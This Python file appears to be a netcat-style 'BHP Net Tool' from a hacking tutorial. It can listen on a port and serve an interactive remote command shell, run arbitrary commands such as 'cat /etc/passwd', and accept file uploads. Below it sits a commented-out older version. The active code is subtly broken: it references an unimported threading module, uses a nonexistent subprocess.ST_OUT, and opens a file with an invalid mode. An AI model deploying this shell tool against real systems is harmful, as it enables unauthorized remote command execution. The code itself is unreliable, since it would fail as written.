import sys
import socket
import argparse
import getopt
from threading import Thread
import subprocess

# listen  = False
# command = False
# upload  = False
# execute = "" 
# target  = ""
# upload_destination = ""
# port    = 0

parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,
                description='BHP Net Tool',
                epilog='''\
Examples:
    bhnet.py -t 192.168.0.1 -p 5555 -l -c
    bhnet.py -t 192.168.0.1 -p 5555 -l -u c:\\target.exe
    bhnet.py -t 192.168.0.1 -p 5555 -l -e 'cat /etc/passwd'
    echo 'ABCDEFGHI' | ./bhnet.py -t 192.168.11.12 -p 135''')
 
parser.add_argument('-l', '--listen', help='listen on [host]:[port] for incoming connections', action='store_true')
parser.add_argument('-e', '--execute', default=None, help='execute the given file upon receiving a connection')
parser.add_argument('-c', '--command', help='initialize a command shell', action='store_true')
parser.add_argument('-u', '--upload', help='upon receiving connection upload a file and write to [destination]')
parser.add_argument('-t', '--target', default=None)
parser.add_argument('-p', '--port', default=None, type=int)
args = parser.parse_args()


def client_sender(buffer):
  client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

  try:
    client.connect((args.target, args.port))
    if len(buffer):
      client.send(buffer)

    while True:
      recv_len = 1
      response = ''

      while recv_len:
        data = client.recv(4096)
        recv_len = len(data)
        response += data.decode('utf-8')
        if recv_len < 4096:
          break

      print(response.rstrip(), end='')
      buffer = input()
      if buffer == '':
        continue
      if buffer == 'exit':
        client.send(b'exit')
        break
      client.send(buffer.encode('utf-8'))
    client.close()
  except:
    print('[*] Exception! Exiting.')
    import traceback
    traceback.print_exc()
    client.close()

def server_loop():

  if not args.target:
    args.target = '0.0.0.0'

  server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  server.bind((args.target, args.port))

  server.listen(5)

  while True:
    client_socket, addr = server.accept()
    client_thread = threading.Thread(target=client_handler, args=[client_socket,])
    client_thread.start()

def run_command(command):
  command = command.rstrip()

  try:
    output = subprocess.check_output(
                  command, stderr=subprocess.ST_OUT, shell=True)
  except:
    output = b'Failed to execute commnad.'

  return output

def client_handler(client_socket):
  if args.upload:
    file_buffer = b''

    while True:
      data = client_socket.recv(1024)
      file_buffer += data
      if len(data) < 1024:
        break

    try:
      file_description = open(args.upload, 'web')
      file_description.write(file_buffer)
      file_description.close()

      client_socket.send('Successfully saved file to {}'.format(args.upload).encode('utf-8'))
    except:
      client_socket.send('Failed to saved file to {}'.format(args.upload).encode('utf-8'))

  if args.execute:
    output = run_command(args.execute)
    client_socket.send(output)

  if args.command:
    prompt = b'<BH:#> '
    client_socket.send(prompt)

    while True:
      recv_len = 1
      cmd_buffer = ''
      while recv_len:
        buffer = client_socket.recv(1024)
        recv_len = len(buffer)
        cmd_buffer += buffer.decode('utf-8')
        if recv_len < 1024:
          break
      if cmd_buffer == 'exit':
        client_socket.close()
        break

      response = run_command(cmd_buffer)

      client_socket.send(response + prompt)

def main():
  if not args.listen and args.target and args.port:
    buffer = sys.stdin.read()
    client_sender(buffer.encode('utf-8'))
  elif args.listen:
    server_loop()
  else:
    parser.print_help()
    sys.exit(1)

if __name__ == '__main__':
  main()

# def useage():
#   print("BHP NET Toozl")
#   print("")
#   print("Usage: bhnet.apy -t target_host -p port")
#   print("-l --listen                  - listen on [host]:[port] for")
#   print("                               incoming connection")
#   print("-e --execute=file_to_run     - execute the given file upon")
#   print("                               receiving a connection")
#   print("-c --command                 - initialize a command shell")
#   print("-u --upload=destination      - upon receiving connection upload a")
#   print("                               file and write to [destination]")
#   print("")
#   print("")
#   print("Examples: ")
#   print("bhnet.py -t 192.168.0.1 -p 5555 -l -c")
#   print("bhnet.py -t 192.168.0.1 -p 5555 -l -u c:\\target.exec")
#   print("bhnet.py -t 192.168.0.1 -p 5555 -l -e c:\"cat /etc/passwd\"")
#   print("echo 'ABCDEFGHI' | ./bhnet.py -t 192.168.11.12 -p 135")
#   sys.exit(0)

# def client_sender(client_socket):
#   global upload
#   global execute
#   global command

#   if len(upload_destination):
#     file_buffer = b''

#     while True:
#       data = client_socket.recv(1024)
#       if len(data) == 0:
#         break
#       else:
#         file_buffer += data

#     try:
#       file_description = open(upload_destination, "wb")
#       file_description.write(file_buffer)
#       file_description.close()

#       client_socket.send("Successfully saved file to {}\r\n".format(upload_destination))
#     except:
#       client_socket.send("Failed to save file  to {}\r\n".format(upload_destination))

#   if len(execute):
#     output = run_command(execute)
#     client_socket.send(output)

#   if command:
#     prompt = "<BUHP:#> "
#     client_socket.send(prompt)

#     while True:
#       cmd_buffer = ''
#       while "\n" not in cmd_buffer:
#         cmd_buffer += client_socketrecv(1024)
#       reponse = run_command(cmd_buffer)
#       response += prompt

#       client_socket.send(response)

# def server_loop():
#   global target

#   if not len(target):
#     target = '0.0.0.0'

#   server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#   server.bind((target, port))

#   server.listen(5)

#   while True:
#     client_socket, addr = server.accept()

#     client_thread = threading.Thread(target=client_handler, args=[client_socket,])
#     client_thread.start()

# def run_command(command):
#   command = command.rstrip()

#   try:
#     output = subprocess.check_output(command, stderr=subprocess.ST_OUT, shell=True)
#   except:
#     output = b"Failed to execute commnad.\r\n"

#   return output

# def main():
#   global listen
#   global port
#   global execute
#   global command
#   global upload_destination
#   global target

#   if not len(sys.argv[:1]):
#     useage()

#   try:
#     opts, args = getopt.getopt(
#         sys.argv[1:],
#         "hle:t:p:cu",
#         ["help", "listen", "execute=", "target=",
#           "port=", "command", "upload="])
#   except getopt.GetoptError as err:
#     print(str(err))
#     useage()

#   for o,a in opts:
#     if o in ("-h", "--help"):
#       useage()
#     elif o in ("-l", "--listen"):
#       listen = True
#     elif o in ("-e", "--excute"):
#       execute = a
#     elif o in ("-c", "--commandshell"):
#       command = True
#     elif o in ("-u", "--upload"):
#       upload_destination = a
#     elif o in ("-t", "--target"):
#       target = a
#     elif o in ("-p", "--port"):
#       port = int(a)
#     else:
#       assert False, "Unhandled Option"

#   if not listen and len(target) and port > 0:
#     buffer = sys.stdin.read()
#     client_sender(buffer)

#   if listen:
#     server_loop()

# main()